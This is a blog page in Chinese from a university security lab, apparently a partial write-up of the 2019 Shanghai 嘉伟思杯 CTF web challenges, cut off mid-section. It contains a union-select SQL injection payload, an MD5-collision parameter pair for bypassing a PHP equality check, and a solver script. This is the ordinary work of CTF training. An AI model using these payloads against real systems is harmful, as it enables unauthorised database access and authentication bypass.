@@ -1,0 +1,957 @@
+<!DOCTYPE html>
+<html style="display: none;" lang="zh">
+    <head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <!--
+        © Material Theme
+        https://github.com/viosey/hexo-theme-material
+        Version: 1.5.6 -->
+    <script>
+        window.materialVersion = "1.5.6"
+        // Delete localstorage with these tags
+        window.oldVersion = [
+            'codestartv1',
+            '1.3.4',
+            '1.4.0',
+            '1.4.0b1',
+            '1.5.0',
+            '1.5.2',
+            '1.5.5'
+        ]
+    </script>
+
+    <!-- dns prefetch -->
+    <meta http-equiv="x-dns-prefetch-control" content="on">
+
+
+
+
+
+
+
+
+
+    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
+
+
+
+
+
+    <!-- Meta & Info -->
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <!-- Title -->
+    
+    <title>
+        
+            CTF | 上海嘉伟思杯_WP | 
+        
+        0xFAFU实验室
+    </title>
+
+    <!-- Favicons -->
+    <link rel="icon shortcut" type="image/ico" href="/img/favicon.png">
+    <link rel="icon" href="/img/favicon.png">
+
+    <meta name="format-detection" content="telephone=no">
+    <meta name="description" itemprop="description" content>
+    <meta name="keywords" content>
+    <meta name="theme-color" content="#0097A7">
+
+    <!-- Disable Fucking Bloody Baidu Tranformation -->
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+
+    <!--[if lte IE 9]>
+        <link rel="stylesheet" href="/css/ie-blocker.css">
+
+        
+            <script src="/js/ie-blocker.zhCN.js"></script>
+        
+    <![endif]-->
+
+    <!-- Import lsloader -->
+    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(a){try{localStorage.removeItem(a)}catch(b){}};lsloader.setLS=function(a,c){try{localStorage.setItem(a,c)}catch(b){}};lsloader.getLS=function(a){var c="";try{c=localStorage.getItem(a)}catch(b){c=""}return c};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var b=[];for(var a=0;a<localStorage.length;a++){b.push(localStorage.key(a))}b.forEach(function(e){var f=lsloader.getLS(e);if(window.oldVersion){var d=window.oldVersion.reduce(function(g,h){return g||f.indexOf("/*"+h+"*/")!==-1},false);if(d){lsloader.removeLS(e)}}})}catch(c){}};lsloader.clean();lsloader.load=function(f,a,b,d){if(typeof b==="boolean"){d=b;b=undefined}d=d||false;b=b||function(){};var e;e=this.getLS(f);if(e&&e.indexOf(versionString)===-1){this.removeLS(f);this.requestResource(f,a,b,d);return}if(e){var c=e.split(versionString)[0];if(c!=a){console.log("reload:"+a);this.removeLS(f);this.requestResource(f,a,b,d);return}e=e.split(versionString)[1];if(d){this.jsRunSequence.push({name:f,code:e});this.runjs(a,f,e)}else{document.getElementById(f).appendChild(document.createTextNode(e));b()}}else{this.requestResource(f,a,b,d)}};lsloader.requestResource=function(b,e,a,c){var d=this;if(c){this.iojs(e,b,function(h,f,g){d.setLS(f,h+versionString+g);d.runjs(h,f,g)})}else{this.iocss(e,b,function(f){document.getElementById(b).appendChild(document.createTextNode(f));d.setLS(b,e+versionString+f)},a)}};lsloader.iojs=function(d,b,g){var a=this;a.jsRunSequence.push({name:b,code:""});try{var f=new XMLHttpRequest();f.open("get",d,true);f.onreadystatechange=function(){if(f.readyState==4){if((f.status>=200&&f.status<300)||f.status==304){if(f.response!=""){g(d,b,f.response);return}}a.jsfallback(d,b)}};f.send(null)}catch(c){a.jsfallback(d,b)}};lsloader.iocss=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.iofonts=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.runjs=function(f,c,e){if(!!c&&!!e){for(var b in this.jsRunSequence){if(this.jsRunSequence[b].name==c){this.jsRunSequence[b].code=e}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var a=document.createElement("script");a.appendChild(document.createTextNode(this.jsRunSequence[0].code));a.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(a);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else{if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var d=this;var a=document.createElement("script");a.src=this.jsRunSequence[0].path;a.type="text/javascript";this.jsRunSequence[0].status="loading";a.onload=function(){d.jsRunSequence.shift();if(d.jsRunSequence.length>0){d.runjs()}};document.body.appendChild(a)}}};lsloader.tagLoad=function(b,a){this.jsRunSequence.push({name:a,code:"",path:b,status:"failed"});this.runjs()};lsloader.jsfallback=function(c,b){if(!!this.jsnamemap[b]){return}else{this.jsnamemap[b]=b}for(var a in this.jsRunSequence){if(this.jsRunSequence[a].name==b){this.jsRunSequence[a].code="";this.jsRunSequence[a].status="failed";this.jsRunSequence[a].path=c}}this.runjs()};lsloader.cssfallback=function(e,c,b){if(!!this.cssnamemap[c]){return}else{this.cssnamemap[c]=1}var d=document.createElement("link");d.type="text/css";d.href=e;d.rel="stylesheet";d.onload=d.onerror=b;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(d,a)};lsloader.runInlineScript=function(c,b){var a=document.getElementById(b).innerText;this.jsRunSequence.push({name:c,code:a});this.runjs()}})();</script>
+
+    <!-- Import queue -->
+    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>
+
+    <!-- Import CSS -->
+    
+        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?NKhlKQkXw/c66TR5p4wO+w==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+        
+
+    
+
+    
+
+    <!-- Config CSS -->
+
+<!-- Other Styles -->
+<style>
+  body, html {
+    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
+    overflow-x: hidden !important;
+  }
+  
+  code {
+    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
+  }
+
+  a {
+    color: #00838F;
+  }
+
+  .mdl-card__media,
+  #search-label,
+  #search-form-label:after,
+  #scheme-Paradox .hot_tags-count,
+  #scheme-Paradox .sidebar_archives-count,
+  #scheme-Paradox .sidebar-colored .sidebar-header,
+  #scheme-Paradox .sidebar-colored .sidebar-badge{
+    background-color: #0097A7 !important;
+  }
+
+  /* Sidebar User Drop Down Menu Text Color */
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
+  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
+    color: #0097A7 !important;
+  }
+
+  #post_entry-right-info,
+  .sidebar-colored .sidebar-nav li:hover > a,
+  .sidebar-colored .sidebar-nav li:hover > a i,
+  .sidebar-colored .sidebar-nav li > a:hover,
+  .sidebar-colored .sidebar-nav li > a:hover i,
+  .sidebar-colored .sidebar-nav li > a:focus i,
+  .sidebar-colored .sidebar-nav > .open > a,
+  .sidebar-colored .sidebar-nav > .open > a:hover,
+  .sidebar-colored .sidebar-nav > .open > a:focus,
+  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
+    color: #0097A7 !important;
+  }
+
+  .toTop {
+    background: #757575 !important;
+  }
+
+  .material-layout .material-post>.material-nav,
+  .material-layout .material-index>.material-nav,
+  .material-nav a {
+    color: #757575;
+  }
+
+  #scheme-Paradox .MD-burger-layer {
+    background-color: #757575;
+  }
+
+  #scheme-Paradox #post-toc-trigger-btn {
+    color: #757575;
+  }
+
+  .post-toc a:hover {
+    color: #00838F;
+    text-decoration: underline;
+  }
+
+</style>
+
+
+<!-- Theme Background Related-->
+
+    <style>
+      body{
+        background-color: #F5F5F5;
+      }
+
+      /* blog_info bottom background */
+      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
+        background-color: #fff;
+      }
+    </style>
+
+
+
+
+<!-- Fade Effect -->
+
+    <style>
+      .fade {
+        transition: all 800ms linear;
+        -webkit-transform: translate3d(0,0,0);
+        -moz-transform: translate3d(0,0,0);
+        -ms-transform: translate3d(0,0,0);
+        -o-transform: translate3d(0,0,0);
+        transform: translate3d(0,0,0);
+        opacity: 1;
+      }
+
+      .fade.out{
+        opacity: 0;
+      }
+    </style>
+
+
+<!-- Import Font -->
+<!-- Import Roboto -->
+
+    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">
+
+
+<!-- Import Material Icons -->
+
+
+    <style id="material_icons"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_icons","/css/material-icons.css?pqhB/Rd/ab0H2+kZp0RDmw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
+
+
+
+
+    <!-- Import jQuery -->
+    
+        <script>lsloader.load("jq_js","/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==", true)</script>
+    
+
+    <!-- WebAPP Icons -->
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="application-name" content="0xFAFU实验室">
+    <meta name="msapplication-starturl" content="http://yoursite.com/2019/04/10/CTF-上海嘉伟思杯-WP/">
+    <meta name="msapplication-navbutton-color" content="#0097A7">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-title" content="0xFAFU实验室">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon" href="/img/favicon.png">
+
+    <!-- Site Verification -->
+    
+    
+
+    <!-- RSS -->
+    
+
+    <!-- The Open Graph protocol -->
+    <meta property="og:url" content="http://yoursite.com/2019/04/10/CTF-上海嘉伟思杯-WP/">
+    <meta property="og:type" content="blog">
+    <meta property="og:title" content="CTF | 上海嘉伟思杯_WP | 0xFAFU实验室">
+    <meta property="og:image" content="/img/favicon.png">
+    <meta property="og:description" content>
+    
+
+    
+        <meta property="article:published_time" content="Wed Apr 10 2019 16:31:57 GMT+0800">
+        <meta property="article:modified_time" content="Wed Apr 10 2019 16:34:04 GMT+0800">
+    
+
+    <!-- The Twitter Card protocol -->
+    <meta name="twitter:card" content="summary_large_image">
+
+    <!-- Add canonical link for SEO -->
+    
+        <link rel="canonical" href="http://yoursite.com/2019/04/10/CTF-上海嘉伟思杯-WP/index.html">
+    
+
+    <!-- Structured-data for SEO -->
+    
+        
+
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "BlogPosting",
+    "mainEntityOfPage": "http://yoursite.com/2019/04/10/CTF-上海嘉伟思杯-WP/index.html",
+    "headline": "CTF | 上海嘉伟思杯_WP",
+    "datePublished": "Wed Apr 10 2019 16:31:57 GMT+0800",
+    "dateModified": "Wed Apr 10 2019 16:34:04 GMT+0800",
+    "author": {
+        "@type": "Person",
+        "name": "FAFU",
+        "image": {
+            "@type": "ImageObject",
+            "url": "/img/avatar.png"
+        },
+        "description": "Hi, nice to meet you"
+    },
+    "publisher": {
+        "@type": "Organization",
+        "name": "0xFAFU实验室",
+        "logo": {
+            "@type":"ImageObject",
+            "url": "/img/favicon.png"
+        }
+    },
+    "keywords": "",
+    "description": "",
+}
+</script>
+
+
+    
+
+    <!-- Analytics -->
+    
+    
+    
+
+    <!-- Custom Head -->
+    
+
+</head>
+
+
+    
+        <body id="scheme-Paradox" class="lazy">
+            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
+                
+
+                <!-- Main Container -->
+                <main class="material-layout__content" id="main">
+
+                    <!-- Top Anchor -->
+                    <div id="top"></div>
+
+                    
+                        <!-- Hamburger Button -->
+                        <button class="MD-burger-icon sidebar-toggle">
+                            <span id="MD-burger-id" class="MD-burger-layer"></span>
+                        </button>
+                    
+
+                    <!-- Post TOC -->
+
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+
+    <!-- Left aligned menu below button -->
+    
+    
+    <button id="post-toc-trigger-btn" class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Web"><span class="post-toc-number">1.</span> <span class="post-toc-text">Web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#土肥原贤二"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">土肥原贤二</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#吴佩孚"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">吴佩孚</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#戴星炳"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">戴星炳</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#晴气庆胤"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">晴气庆胤</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#冈村宁次"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">冈村宁次</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#作战计划"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">作战计划</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#池步洲"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">池步洲</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#密码学"><span class="post-toc-number">2.</span> <span class="post-toc-text">密码学</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#日军空袭"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">日军空袭</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#潘汉年"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">潘汉年</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#袁殊"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">袁殊</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#杂项"><span class="post-toc-number">3.</span> <span class="post-toc-text">杂项</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#死亡真相"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">死亡真相</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#大美晚报"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">大美晚报</span></a></li></ol></li></ol>
+    </ul>
+    
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
+    
+        
+            <!-- Random Thumbnail -->
+            <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
+
+    $('.post_thumbnail-random').attr('data-original', '/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').addClass('lazy');
+</script>
+
+        
+    
+            <p class="article-headline-p">
+                CTF | 上海嘉伟思杯_WP
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="/img/avatar.png" width="44px" height="44px" alt="Author Avatar">
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>FAFU</strong>
+        <span>4月 10, 2019</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+
+    <!-- Tags (bookmark) -->
+    
+
+    <!-- Share -->
+    
+        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=CTF | 上海嘉伟思杯_WP&url=http://yoursite.com/2019/04/10/CTF-上海嘉伟思杯-WP/index.html&pic=http://yoursite.com/img/favicon.png&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=CTF | 上海嘉伟思杯_WP&url=http://yoursite.com/2019/04/10/CTF-上海嘉伟思杯-WP/index.html&via=FAFU" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/04/10/CTF-上海嘉伟思杯-WP/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=http://yoursite.com/2019/04/10/CTF-上海嘉伟思杯-WP/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+
+    <!-- Share QQ -->
+    
+
+    <!-- Share Telegram -->
+    
+</ul>
+
+    
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="土肥原贤二"><a href="#土肥原贤二" class="headerlink" title="土肥原贤二"></a>土肥原贤二</h3><p>题目链接：<a href="http://47.103.43.235:81/quest/web/a/index.php" target="_blank" rel="noopener">http://47.103.43.235:81/quest/web/a/index.php</a></p>
+<p>SQL注入题，没有过滤特殊字符，gid通过单引号包裹，采用联合查询注入</p>
+<p>payload：<code>?gid=0&#39;%20union%20select%201,(select%20flag%20from%20flag),3,4%23</code></p>
+<p>flag:<code>flag{20_welcome_19}</code></p>
+<h3 id="吴佩孚"><a href="#吴佩孚" class="headerlink" title="吴佩孚"></a>吴佩孚</h3><p>题目链接：<a href="http://47.103.43.235:85/b/%E7%AC%AC%E4%B8%80%E9%A2%98_js%EF%BC%9F.txt" target="_blank" rel="noopener">http://47.103.43.235:85/b/%E7%AC%AC%E4%B8%80%E9%A2%98_js%EF%BC%9F.txt</a></p>
+<p>给了一串字符，经过<strong>base64解密</strong>后，得到一串<strong>jsfuck</strong>代码，经过网站<a href="https://www.bugku.com/tools/jsfuck/解密后得到flag" target="_blank" rel="noopener">https://www.bugku.com/tools/jsfuck/解密后得到flag</a></p>
+<p><img src="/2019/04/10/CTF-上海嘉伟思杯-WP/./1.png" alt></p>
+<p>flag:<code>flag{sdf465454dfgert32}</code></p>
+<h3 id="戴星炳"><a href="#戴星炳" class="headerlink" title="戴星炳"></a>戴星炳</h3><p>题目链接：<a href="http://47.103.43.235:82/web/a/index.php" target="_blank" rel="noopener">http://47.103.43.235:82/web/a/index.php</a></p>
+<p>题目意思是计算一串公式，但是每次刷新页面公式内容都会变化，所以要通过python的Session机制提交计算结果，脚本代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">"http://47.103.43.235:82/web/a/index.php"</span></span><br><span class="line">r = s.get(url)</span><br><span class="line">soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>)</span><br><span class="line">a = re.findall(<span class="string">'&lt;p&gt;(.*)&lt;/p&gt;'</span>,str(soup.find_all(<span class="string">'p'</span>)[<span class="number">1</span>]))[<span class="number">0</span>]</span><br><span class="line">result = eval(a)</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'result'</span>:result</span><br><span class="line">    &#125;</span><br><span class="line">r1 = s.post(url,data=data)</span><br><span class="line">print(r1.text)</span><br></pre></td></tr></table></figure>
+<p>flag:<code>flag{Y0U_4R3_3o_F4ST!}</code></p>
+<h3 id="晴气庆胤"><a href="#晴气庆胤" class="headerlink" title="晴气庆胤"></a>晴气庆胤</h3><p>题目链接：<a href="http://47.103.43.235:85/a/" target="_blank" rel="noopener">http://47.103.43.235:85/a/</a></p>
+<p>源代码给出了提示：<code>if ((string)$_POST[&#39;paraml&#39;]!==(string)$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;paraml&#39;])===md5($_POST[&#39;param2&#39;]))</code></p>
+<p>要提交两个md5值完全相等的参数，参考链接<a href="https://xz.aliyun.com/t/2232" target="_blank" rel="noopener">https://xz.aliyun.com/t/2232</a></p>
+<p>通过链接中的<strong>fastcoll_v1.0.0.5.exe</strong>文件，使用命令<code>fastcoll_v1.0.0.5.exe -p init.txt -o 1.txt 2.txt</code></p>
+<p><img src="/2019/04/10/CTF-上海嘉伟思杯-WP/./2.png" alt></p>
+<p>生成<code>1.txt</code>和<code>2.txt</code>两个文件</p>
+<p>再通过以下代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">"rb"</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'二进制hash '</span>. md5( (readmyfile(<span class="string">"1.txt"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>. urlencode(readmyfile(<span class="string">"1.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5(urlencode (readmyfile(<span class="string">"1.txt"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'二进制hash '</span>.md5( (readmyfile(<span class="string">"2.txt"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'URLENCODE '</span>.  urlencode(readmyfile(<span class="string">"2.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'URLENCODE hash '</span>.md5( urlencode(readmyfile(<span class="string">"2.txt"</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br></pre></td></tr></table></figure>
+<p>生成两个hash一样，但是实际内容不一样的字符串</p>
+<p><img src="/2019/04/10/CTF-上海嘉伟思杯-WP/./3.png" alt></p>
+<p>将这两串字符分别提交，获得flag，payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyrer%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EF%F5%7C9%D5K%BAK%C6%C7N%3Be%93%F8P%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BCz%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8%E4%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9E%F4%EFzG%9B&amp;param2=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%8D%13%BE%8Fu%F7s%3B%60v%7E%BD%C46%B6%BA%CCyr%E5r%F69%C84%2Az%92PB%97%ED%0D%09%AD%CD%DD%02%8C%A1%C7%CBG%D9%EFu%7D9%D5K%BAK%C6%C7N%3Be%93%F8%D0%5BH%27Qk%1Cr%80%9F-r%8D%0B%AC%D0aW%7F%13h+%7F%BC%FA%13%86F%AF%CB%1An%CB%EC%86%02%F0%0E%26%A6%D8%F6%D1%E3O%88%8C9w%C8d%C5f2%FA%ED%2B%02%E6%91%0E%CC%5C%9Et%EFzG%9B</span><br></pre></td></tr></table></figure>
+<p>flag:<code>flag{MD5@_@success}</code></p>
+<h3 id="冈村宁次"><a href="#冈村宁次" class="headerlink" title="冈村宁次"></a>冈村宁次</h3><p>题目链接：<a href="http://47.103.43.235:83/web/a/index.php?id===QM" target="_blank" rel="noopener">http://47.103.43.235:83/web/a/index.php?id===QM</a></p>
+<p>查询结果的id字段为1，而1的base64加密结果为<code>MQ==</code>，说明id参数的值经过base64解密后再反转再添加到SQL语句中，在py命令行中使用<code>base64.b64encode(&#39;&#39;)[::-1]</code>进行base64加密再反转效果</p>
+<p>经过测试，这题对<code>sleep,extractvalue,updatexml</code>函数进行了检查，检查到再最前面添加<code>1</code>，所以无法使用报错和延时注入</p>
